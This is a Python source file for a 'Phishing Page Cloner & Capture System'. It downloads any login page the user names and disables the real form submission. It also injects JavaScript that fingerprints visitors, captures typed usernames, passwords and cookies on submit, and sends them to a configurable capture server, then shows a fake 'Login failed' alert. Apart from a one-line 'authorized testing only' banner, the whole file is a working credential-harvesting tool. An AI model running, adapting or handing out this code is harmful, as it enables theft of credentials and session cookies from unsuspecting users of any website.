import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import os
import re
from datetime import datetime
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PhishingCloner:
    def __init__(self, target_url, capture_server="http://localhost:5000"):
        self.target_url = target_url
        self.capture_server = capture_server
        self.domain = urlparse(target_url).netloc
        
    def clone_page(self):
        """Clone the target login page"""
        print(f"\n🎯 Cloning page: {self.target_url}")
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            response = requests.get(self.target_url, headers=headers, timeout=15, verify=False)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Add base tag to handle relative URLs
            self._add_base_tag(soup)
            
            # Fix resources
            self._fix_resources(soup)
            
            # Inject capture script
            self._inject_capture_script(soup)
            
            # Modify forms
            self._modify_forms(soup)
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"phishing_{self.domain.replace('.', '_')}_{timestamp}.html"
            
            # Save
            html_content = str(soup.prettify())
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print(f"✅ Phishing page created: {filename}")
            return filename
            
        except Exception as e:
            print(f"❌ Error: {e}")
            return None
    
    def _add_base_tag(self, soup):
        """Add base tag for relative URLs"""
        base_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}/"
        
        # Remove existing base tag
        for base in soup.find_all('base'):
            base.decompose()
        
        # Add new base tag
        base_tag = soup.new_tag('base', href=base_url)
        if soup.head:
            soup.head.insert(0, base_tag)
        
        print("✅ Base tag added")
    
    def _fix_resources(self, soup):
        """Fix all resource URLs"""
        print("🔧 Fixing resources...")
        
        # Images
        for img in soup.find_all('img'):
            if img.get('src'):
                img['src'] = urljoin(self.target_url, img['src'])
        
        # CSS
        for link in soup.find_all('link', rel='stylesheet'):
            if link.get('href'):
                link['href'] = urljoin(self.target_url, link['href'])
        
        # Scripts (but not our capture script)
        for script in soup.find_all('script'):
            if script.get('src') and 'capture-script' not in script.get('id', ''):
                original_src = script['src']
                new_src = urljoin(self.target_url, original_src)
                script['src'] = new_src
                # Add crossorigin attribute for CORS
                script['crossorigin'] = 'anonymous'
        
        print("✅ Resources fixed")
    
    def _inject_capture_script(self, soup):
        """Inject credential capture script"""
        print("💉 Injecting capture script...")
        
        # IMPROVED capture script with better error handling
        capture_js = f"""
        <script id="capture-script">
        (function() {{
            'use strict';
            
            console.log('%c🎯 Phishing Capture System Active', 'color: red; font-size: 16px; font-weight: bold');
            
            const CONFIG = {{
                CAPTURE_URL: '{self.capture_server}/capture',
                ORIGINAL_URL: '{self.target_url}',
                SESSION_ID: Date.now() + '_' + Math.random().toString(36).substr(2, 9)
            }};
            
            // Send data function
            async function sendData(data) {{
                data.session_id = CONFIG.SESSION_ID;
                data.page_url = CONFIG.ORIGINAL_URL;
                
                console.log('📤 Sending:', data.type);
                
                try {{
                    const response = await fetch(CONFIG.CAPTURE_URL, {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json',
                        }},
                        body: JSON.stringify(data),
                        mode: 'cors'
                    }});
                    
                    const result = await response.json();
                    console.log('✅ Captured successfully:', result);
                    return true;
                    
                }} catch (error) {{
                    console.error('❌ Failed to send:', error);
                    
                    // Fallback: save locally
                    try {{
                        let offline = JSON.parse(localStorage.getItem('offline_captures') || '[]');
                        offline.push(data);
                        localStorage.setItem('offline_captures', JSON.stringify(offline));
                        console.log('💾 Saved offline');
                    }} catch(e) {{}}
                    
                    return false;
                }}
            }}
            
            // Initial visit tracking
            sendData({{
                type: 'page_visit',
                url: window.location.href,
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                language: navigator.language,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            }});
            
            // Wait for DOM
            window.addEventListener('DOMContentLoaded', function() {{
                console.log('📄 DOM loaded, monitoring forms...');
                
                const forms = document.querySelectorAll('form');
                console.log(`📋 Found ${{forms.length}} form(s)`);
                
                forms.forEach((form, index) => {{
                    console.log(`🔍 Monitoring form #${{index}}`);
                    
                    // Intercept submission
                    form.addEventListener('submit', async function(e) {{
                        e.preventDefault();
                        e.stopPropagation();
                        
                        console.log('%c🚨 FORM SUBMITTED!', 'color: red; font-size: 20px');
                        
                        // Collect form data
                        const formData = {{}};
                        const formElement = new FormData(form);
                        
                        for (let [key, value] of formElement.entries()) {{
                            formData[key] = value;
                        }}
                        
                        // Also check all inputs
                        form.querySelectorAll('input, textarea, select').forEach(input => {{
                            const name = input.name || input.id || `field_${{input.type}}`;
                            if (input.value) {{
                                formData[name] = input.value;
                                
                                // Mark field type
                                if (input.type === 'password') {{
                                    formData[name + '_FIELDTYPE'] = '🔒 PASSWORD';
                                }} else if (input.type === 'email') {{
                                    formData[name + '_FIELDTYPE'] = '📧 EMAIL';
                                }}
                            }}
                        }});
                        
                        console.log('🔑 Captured data:', formData);
                        
                        // Send to server
                        const sent = await sendData({{
                            type: 'credentials_captured',
                            formData: formData,
                            formIndex: index,
                            url: CONFIG.ORIGINAL_URL,
                            cookies: document.cookie,
                            timestamp: new Date().toISOString()
                        }});
                        
                        // Show fake loading
                        const submitBtn = form.querySelector('button[type="submit"], input[type="submit"], button:not([type])');
                        
                        if (submitBtn) {{
                            const originalText = submitBtn.textContent || submitBtn.value;
                            submitBtn.disabled = true;
                            
                            if (submitBtn.textContent) {{
                                submitBtn.textContent = 'Signing in...';
                            }} else {{
                                submitBtn.value = 'Signing in...';
                            }}
                            
                            // Show error after delay
                            setTimeout(() => {{
                                alert('⚠️ Login failed. Please check your credentials and try again.');
                                
                                submitBtn.disabled = false;
                                if (submitBtn.textContent) {{
                                    submitBtn.textContent = originalText;
                                }} else {{
                                    submitBtn.value = originalText;
                                }}
                                
                                // Clear password
                                form.querySelectorAll('input[type="password"]').forEach(p => p.value = '');
                                
                            }}, 2500);
                        }}
                        
                        return false;
                    }}, true); // Use capture phase
                    
                    // Monitor input fields
                    form.querySelectorAll('input').forEach(input => {{
                        input.addEventListener('blur', function() {{
                            if (this.value && (this.type === 'email' || this.type === 'text' || this.type === 'password')) {{
                                sendData({{
                                    type: 'field_completed',
                                    field_name: this.name || this.id,
                                    field_type: this.type,
                                    value_length: this.value.length,
                                    timestamp: new Date().toISOString()
                                }});
                            }}
                        }});
                    }});
                }});
            }});
            
            console.log('✅ Capture system ready');
        }})();
        </script>
        """
        
        script_tag = BeautifulSoup(capture_js, 'html.parser')
        if soup.body:
            soup.body.append(script_tag)
        else:
            if not soup.html:
                soup.append(soup.new_tag('html'))
            if not soup.body:
                soup.html.append(soup.new_tag('body'))
            soup.body.append(script_tag)
        
        print("✅ Capture script injected")
    
    def _modify_forms(self, soup):
        """Modify forms to prevent real submission"""
        print("📝 Modifying forms...")
        
        for form in soup.find_all('form'):
            # Save original action
            if form.get('action'):
                form['data-original-action'] = form['action']
            
            # Prevent default submission
            form['action'] = '#'
            form['method'] = 'post'
            
            # Remove any onsubmit handlers
            if form.get('onsubmit'):
                form['data-original-onsubmit'] = form['onsubmit']
                del form['onsubmit']
        
        print("✅ Forms modified")


def print_banner():
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║          🎣 PHISHING PAGE CLONER & CAPTURE SYSTEM 🎣        ║
    ║                        Version 3.0                           ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    
    ⚠️  FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
    
    Features:
    ✅ Clone any login page
    ✅ Capture credentials in real-time
    ✅ CORS-free operation
    ✅ Offline fallback storage
    ✅ Detailed logging
    """)


def main():
    print_banner()
    
    print("\n📋 SETUP INSTRUCTIONS:")
    print("1. Make sure capture_server.py is running")
    print("2. Enter the login page URL to clone")
    print("3. Open the generated HTML file")
    print("4. Test and view captures at http://localhost:5000/view\n")
    
    # Check if server is running
    try:
        import requests
        r = requests.get('http://localhost:5000/health', timeout=2)
        print("✅ Capture server is running\n")
    except:
        print("⚠️  WARNING: Capture server not detected!")
        print("   Start it with: python capture_server.py\n")
    
    # Get URL
    target_url = input("🌐 Enter login page URL: ").strip()
    
    if not target_url:
        print("❌ No URL provided")
        return
    
    # Add protocol
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    # Validate
    try:
        parsed = urlparse(target_url)
        if not parsed.netloc:
            print("❌ Invalid URL")
            return
    except:
        print("❌ Invalid URL format")
        return
    
    # Capture server
    capture_server = input(f"\n📡 Capture server [http://localhost:5000]: ").strip()
    if not capture_server:
        capture_server = "http://localhost:5000"
    
    # Confirm
    print(f"\n{'='*70}")
    print(f"Target: {target_url}")
    print(f"Server: {capture_server}")
    print(f"{'='*70}")
    
    confirm = input("\n⚠️  Clone this page? (yes/no): ").strip().lower()
    if confirm != 'yes':
        print("❌ Aborted")
        return
    
    # Clone
    print(f"\n{'='*70}")
    cloner = PhishingCloner(target_url, capture_server)
    filename = cloner.clone_page()
    
    if filename:
        print(f"\n{'='*70}")
        print("✅ SUCCESS!")
        print(f"{'='*70}")
        print(f"\n📄 File: {filename}")
        print(f"📍 Path: {os.path.abspath(filename)}")
        print(f"\n📋 Next Steps:")
        print(f"   1. Open {filename} in browser")
        print(f"   2. Enter test credentials")
        print(f"   3. View at: {capture_server}/view")
        print(f"\n{'='*70}\n")


if __name__ == "__main__":
    main()